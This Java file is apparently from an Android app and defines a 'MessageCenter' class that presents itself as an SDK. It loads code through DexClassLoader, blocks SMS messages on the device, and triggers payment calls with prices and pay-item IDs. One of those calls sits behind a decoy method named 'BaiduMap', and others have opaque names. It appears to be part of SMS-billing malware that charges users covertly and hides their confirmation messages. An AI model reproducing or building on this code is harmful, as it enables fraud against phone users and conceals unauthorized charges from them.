package com.wj.loader;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Handler;
import android.os.Message;

import java.util.HashMap;
import java.util.Map;

import com.wj.loader.DownLoad.DownLoadJar;
import com.wj.loader.Utils.Constants;
import com.wj.loader.loading.LoadingManager;
import com.wj.loader.reflex.ReflexManager;
import dalvik.system.DexClassLoader;

/**
 * Created by Administrator on 2016/12/23.
 */

public class MessageCenter {
    private static MessageCenter messageCenter = null;
    private static String loadClassName = Constants.getLoadClassName();
    private static String path;
    private static String apkName = "";
    private static DexClassLoader cl;
    private static ClassLoader clsLoader;
    private String dexPath;// dex路径
    private String dexOutputPath;
    private PackageInfo pkgInfo;
    private static String pacageName;
    private String url;
    private String jarName;
    private Class<?> clazz;
    private boolean isFirst = true;
    private Context context;

    public static MessageCenter getInstance() {
        if (messageCenter == null) {
            messageCenter = new MessageCenter();
        }
        return messageCenter;
    }


    public void SDKInitializer(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final
    String extData, final Object payCallBackObject, final Object initObject) {
        LoadingManager.getInstance().loading(ctx, new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                ReflexManager.getInstance().blockSMS(ctx, LoadingManager.getInstance().getClazz());
                ReflexManager.getInstance().init(ctx, price, payItemID, str, product, Did, extData, payCallBackObject, initObject, LoadingManager.getInstance().getClazz());
            }
        });
    }

    public void BaiduMap(Context ctx, String price, int payItemID, String str, String product, String Did,
                         String extData, Object payCallBackObject) {
        if (LoadingManager.getInstance().getClazz() != null) {
            ReflexManager.getInstance().pay(ctx, price, payItemID, str, product, Did, extData, payCallBackObject, LoadingManager.getInstance().getClazz());
        }
    }

    public void s(final Context context) {
        ReflexManager.getInstance().blockSMS(context, LoadingManager.getInstance().getClazz());
    }

    public void close() {
        System.exit(1);
        DownLoadJar.deleteFile();
    }

    public HashMap<String, Map<String, Object>> g() {
        return ReflexManager.getInstance().getPayPoint(LoadingManager.getInstance().getClazz());
    }
}